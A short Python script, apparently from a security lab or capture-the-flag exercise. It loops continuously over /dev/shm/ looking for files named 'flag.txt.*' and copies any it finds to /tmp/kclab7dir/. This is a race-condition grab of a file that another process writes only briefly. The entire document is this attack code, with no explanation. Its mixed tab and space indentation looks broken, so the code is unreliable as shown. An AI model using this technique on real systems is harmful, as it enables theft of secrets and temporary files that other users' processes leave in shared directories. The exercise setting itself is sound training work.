import sys
import os
import shutil
import glob

# Specify Target Directories
source_directory = "/dev/shm/"
destination_directory = "/tmp/kclab7dir/"

while True:
	# Define Pattern to Match
	pattern = "flag.txt.*"

    # For Each File That Matches Flag Pattern
	for filename in glob.glob(os.path.join(source_directory, pattern)):
		
        # Attempt to Copy
        try:
			shutil.copy(filename, destination_directory)

			print(f"\nFlag Successfully Copied to {destination_directory}")

			# Exit script when a successful copy is made
			sys.exit() 

		except FileNotFoundError:
			pass  # restart loop